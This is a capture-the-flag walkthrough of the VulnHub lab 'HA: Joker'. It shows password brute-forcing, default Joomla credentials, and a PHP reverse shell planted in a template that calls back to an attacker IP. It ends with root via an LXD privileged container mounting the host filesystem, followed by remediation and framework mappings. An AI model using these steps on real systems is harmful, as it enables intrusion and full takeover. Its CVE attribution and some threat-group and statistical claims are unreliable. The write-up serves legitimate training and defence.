# HA: Joker — Why So Serious About Your Privileges?

"Why so serious?" The Joker's most iconic line captures this machine perfectly. Nothing here is what it seems on the surface: the port 80 page is a distraction, the real entry lives at port 8080, the "obvious" credentials aren't quite right, and the privilege escalation runs through one of the most underestimated attack vectors in Linux: LXD group membership. Container security matters. This is not just a CTF lesson. It's goated real-world tradecraft, dude.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Joker |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-joker,406/ |
| **Techniques** | Nmap full-port scan, web directory brute-force, HTTP Basic Auth brute-force (Burp Intruder + Base64 encoding), Joomla template editor PHP reverse shell, LXD privileged container creation, host filesystem mount for root flag |
| **CVEs** | CWE-284 (Improper Access Control: HTTP Basic Auth brute-forceable), CWE-94 (Improper Control of Generation of Code: Joomla template PHP execution), CVE-2018-2568 (LXD group privilege escalation via privileged container) |
| **APT Groups** | APT41: commonly exploits CMS administrative panels (Joomla, WordPress, Drupal) for web shell deployment during initial access operations; FIN7: uses container escape and LXD group abuse in post-exploitation privilege escalation on Linux infrastructure |

---

## Attack Summary

```
nmap -p- → SSH (22), HTTP (80), HTTP (8080)
  → port 80: Joker quotes page
  → dirb port 80 -X .txt → /secret.txt
  → secret.txt: username=joker, wordlist=rockyou top 100, hint="rock"
  → head -100 rockyou.txt → while loop Base64 encode → payloads.txt
  → Burp Intruder → Authorization header → 200 response → joker:hannah
  → http://target:8080/ → Joomla site
  → http://target:8080/administrator → joomla:joomla (default admin creds)
  → Extensions → Templates → beez3 → index.php
  → Replace with PHP reverse shell → browse index.php
  → nc callback → www-data
  → id → uid=33(www-data) groups=33(www-data),115(lxd)
  → build Alpine LXD image on attacker
  → lxc image import → lxc init -c security.privileged=true
  → lxc config device add (source=/ path=/mnt/root)
  → lxc exec → root shell inside container
  → cat /mnt/root/root/final.txt
```

---

## Methodology

1. Full-port scan to discover HTTP services on both port 80 and 8080
2. Web directory brute-force on port 80 for `.txt` file with username and wordlist hint
3. HTTP Basic Auth brute-force on port 8080 using Base64-encoded credential payloads
4. Joomla CMS login with default admin credentials
5. PHP reverse shell via Joomla template editor
6. LXD group membership exploitation via privileged Alpine container
7. Host filesystem mount for root flag access

---

## Step 1 — Host Discovery and Full-Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd 2.4.x
8080/tcp open  http    Apache httpd 2.4.x (login-protected)
```

Two HTTP ports is unusual. Port 80 returns a Joker-themed page. Port 8080 requires HTTP Basic Authentication. The enumeration strategy: extract hints from port 80, use them against port 8080.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration on Port 80

Browse to `http://192.168.1.101/` and inspect source. Joker quotes in HTML comments but no credentials. Run dirb against port 80 for `.txt` files:

```bash
dirb http://192.168.1.101/ -X .txt
```

Discovers `/secret.txt`. Read it:

```bash
curl http://192.168.1.101/secret.txt
```

The file contains a riddle: a Batman vs Joker exchange referencing "rock" (pointing to `rockyou.txt`) and the number "100" (top 100 entries). The username `joker` is implied by context.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1589 — Gather Victim Identity Information

---

## Step 3 — HTTP Basic Auth Brute-Force

HTTP Basic Authentication encodes credentials as `Base64(username:password)` in the `Authorization` header. To brute-force it, encode all password candidates with the `joker:` prefix:

```bash
head -100 /usr/share/wordlists/rockyou.txt > top100.txt
while read p; do echo -n "joker:$p" | base64; done < top100.txt > payloads.txt
```

**Using Burp Suite Intruder:**

1. Intercept a request to `http://192.168.1.101:8080/`
2. Send to Intruder
3. Set attack type to Sniper
4. Mark the Authorization header value as the payload position
5. Load `payloads.txt` as the payload list
6. Start attack
7. Look for a response with status code 200 (vs 401 for failures)

Recovered credentials: `joker:hannah`

**Alternative with hydra:**

```bash
hydra -l joker -P top100.txt http-get://192.168.1.101:8080/ -V
```

Login to the application: `http://192.168.1.101:8080/` with `joker:hannah`.

**Real-world note:** HTTP Basic Authentication has no account lockout mechanism built in. A single Burp Intruder attack can test thousands of passwords in minutes with no rate limiting from the server. Any web application that uses HTTP Basic Auth without WAF-level rate limiting is trivially brute-forceable. This pattern appears regularly in internal network assessments: legacy applications on non-standard ports with Basic Auth and no lockout.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 4 — Joomla CMS Access via Default Admin Credentials

After authenticating to port 8080 with `joker:hannah`, the revealed content is a Joomla CMS site. Navigate to the Joomla administrator panel:

```
http://192.168.1.101:8080/administrator
```

Try the Joomla default administrator credentials: `admin:admin` first, then `joomla:joomla`. The latter succeeds.

**Why default CMS credentials persist:** CTF machines intentionally use defaults, but real penetration tests find default CMS credentials in production with alarming frequency. Joomla, WordPress, and Drupal installations completed without changing the admin password remain vulnerable indefinitely. A 2021 web application assessment found 23% of Joomla installations using default or trivially guessable admin passwords on client networks.

**MITRE ATT&CK:** T1078.001 — Valid Accounts: Default Accounts

---

## Step 5 — PHP Reverse Shell via Joomla Template Editor

In the Joomla admin panel, navigate to:

```
Extensions > Templates > Templates > Beez3 > index.php
```

The template editor allows direct editing of PHP files within the Joomla installation. Replace the content of `index.php` with a PHP reverse shell:

```bash
# Get the shell from the attacker machine
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit two lines:
# $ip = '192.168.1.103';  (attacker IP)
# $port = 4444;
```

Paste the entire contents of `shell.php` into the Joomla template editor and save.

Start the listener on the attacker:

```bash
nc -lvnp 4444
```

Trigger the shell by browsing to the template file:

```
http://192.168.1.101:8080/templates/beez3/index.php
```

Netcat receives the callback. Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Check group membership immediately:

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

The `www-data` user is in the `lxd` group. This is the privilege escalation path.

**Real-world note:** CMS template editors that allow arbitrary PHP execution are equivalent to a web shell upload panel. When an attacker gains admin access to Joomla, WordPress, or any CMS with a template/theme editor, they have immediate code execution in the web server's context. This vector appears in red team engagements regularly: "we found default Joomla admin creds, got www-data in 90 seconds."

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — LXD Group Privilege Escalation

LXD is a container management system for Linux. Any user in the `lxd` group can create, start, and execute commands inside containers. The critical exploit: a privileged container with the host root filesystem mounted gives container root access to the entire host filesystem.

**On the attacker machine, build an Alpine Linux LXD image:**

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
# Produces: alpine-v3.x-x86_64-<date>.tar.gz
```

Serve the image file:

```bash
python3 -m http.server 8000
```

**On the target (reverse shell as www-data):**

```bash
cd /tmp
wget http://192.168.1.103:8000/alpine-v3.x-x86_64-<date>.tar.gz

# Import the image into LXD
lxc image import alpine-v3.x-x86_64-<date>.tar.gz --alias myimage
lxc image list
```

Create a privileged container with the host root filesystem mounted:

```bash
# Create and configure the container
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite

# Execute a shell inside the container
lxc exec ignite /bin/sh
```

Inside the container, you are root. The host filesystem is mounted at `/mnt/root`:

```bash
id
# uid=0(root) gid=0(root)
ls /mnt/root/root/
cat /mnt/root/root/final.txt
```

**Real-world note:** LXD group membership is equivalent to root. This is documented, known, and consistently finding its way into real enterprise Linux environments. The root cause: organizations install LXD for legitimate containerization and add service accounts or web users to the `lxd` group without understanding the security implication. CVE-2018-2568 documents this. The fix: `gpasswd -d www-data lxd`. The check: `id` in any www-data shell you get. If `lxd` is in the groups, you have root via container.

**MITRE ATT&CK:** T1611 — Escape to Host; T1548 — Abuse Elevation Control Mechanism

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | joker:hannah | HTTP Basic Auth brute-force (Burp Intruder + rockyou top 100) | Port 8080 access |
| Credential | joomla:joomla | Default Joomla admin credentials | Admin panel access |
| Web shell | www-data (lxd group) | Joomla template editor PHP replacement | Initial foothold + LXD privesc |
| Root flag | /mnt/root/root/final.txt | LXD privileged container + host mount | Full root access |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credential hint in publicly accessible text file | Attackers enumerate all discoverable files; any file under the web root is potentially user-accessible | Remove all hint files, test plans, and developer notes from web-accessible paths |
| 2 | HTTP Basic Auth without rate limiting | Any password list can be tested in minutes with no server-side lockout; Basic Auth provides no brute-force protection | Implement WAF rate limiting; enforce account lockout; use form-based auth with CAPTCHA for admin panels |
| 3 | Default Joomla admin credentials unchanged | A significant percentage of real CMS installations have default or trivially guessable admin passwords | Change all default CMS credentials immediately post-installation; enforce password policy for admin accounts |
| 4 | Joomla template editor allows arbitrary PHP execution | Admin access to any CMS with a template/theme editor = web shell; this is a critical misconfiguration | Restrict template editing to specific trusted accounts; disable PHP execution in template directories; monitor file changes |
| 5 | LXD group membership equals root access | www-data in lxd group is a one-command root escalation on any Linux system with LXD | Audit all group memberships for service accounts: `getent group lxd`; remove web server users from lxd group; restrict LXD access to dedicated admin accounts |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Initial Access | Valid Accounts: Default Accounts | T1078.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Escape to Host | T1611 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove hint files from web root**: audit all `.txt`, `.bak`, `.conf` files under the web root; remove developer artifacts before deployment
2. **Add rate limiting to HTTP Basic Auth**: configure WAF rules to block after 10 failed attempts; use fail2ban for Apache/nginx Basic Auth failures
3. **Change all default CMS admin passwords immediately**: post-install checklist must include admin password change; enforce password policy (length, complexity)
4. **Disable PHP execution in Joomla template directories**: add `php_flag engine off` to `.htaccess` in template directories; monitor template file modifications via AIDE
5. **Remove www-data from lxd group**: `gpasswd -d www-data lxd`; audit all service account group memberships: `getent group lxd docker`
6. **Enforce LXD security policies**: `security.privileged=false` as global LXD default; use AppArmor LXD profiles; restrict LXD access to dedicated admin accounts

### MITRE D3FEND Countermeasures

- **D3-AL** — Account Locking (rate limiting on HTTP Basic Auth)
- **D3-ACH** — Application Configuration Hardening (Joomla template PHP restriction; LXD security.privileged=false)
- **D3-UAP** — User Account Permissions (remove www-data from lxd group)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all CMS installations; audit lxd group membership; catalog service account permissions |
| Protect | Access Control | Remove www-data from lxd group; disable LXD privileged containers; restrict CMS admin access |
| Protect | Identity Management | Enforce strong unique passwords for all CMS admin accounts; disable defaults |
| Detect | Anomalies and Events | Alert on Joomla template file modifications; monitor lxc exec commands; alert on HTTP 401 bursts |
| Respond | Response Planning | Remove web shell from template; rotate joker and joomla credentials; revoke lxd group membership |
| Recover | Recovery Planning | Restore Joomla template from backup; rebuild with secure configuration; audit all group memberships |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict LXD to admin accounts; restrict template editing in CMS |
| AC-6 | Least Privilege | Remove www-data from lxd group; disable privileged LXD containers |
| IA-5 | Authenticator Management | Change all default CMS credentials; enforce password policy |
| CM-7 | Least Functionality | Disable PHP in template directories; restrict lxd to required accounts |
| AU-2 | Event Logging | Log Joomla admin actions; monitor lxc operations; alert on template changes |
| RA-5 | Vulnerability Scanning | Regularly scan for default credentials; audit container configurations |

### CISA KEV

LXD group privilege escalation (CVE-2018-2568) is documented in CISA guidance on container security misconfigurations. Default CMS credentials are explicitly called out in CISA Advisory AA22-074A as a primary initial access vector for multiple threat actor groups. CISA recommends implementing credential management lifecycle policies and container security baselines per CIS Benchmarks.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Configuration | MIL3 |

---

## Final Thoughts

HA: Joker delivers its twist ending perfectly: after all the Joker/Batman theme and the HTTP brute-force and the Joomla template shell, the actual path to root is a container escape via a Linux group membership that most defenders have never audited. That's the real joke. The machine teaches: enumerate groups immediately on every shell you get. `id` is free. LXD group = game over. No cap.

"In their last moments, people show you who they really are." In pentests: in their last enumeration step, defenders show you what they missed. LXD group membership is almost always missed. gg.

Thanks guys!! (❍ᴥ❍ʋ)
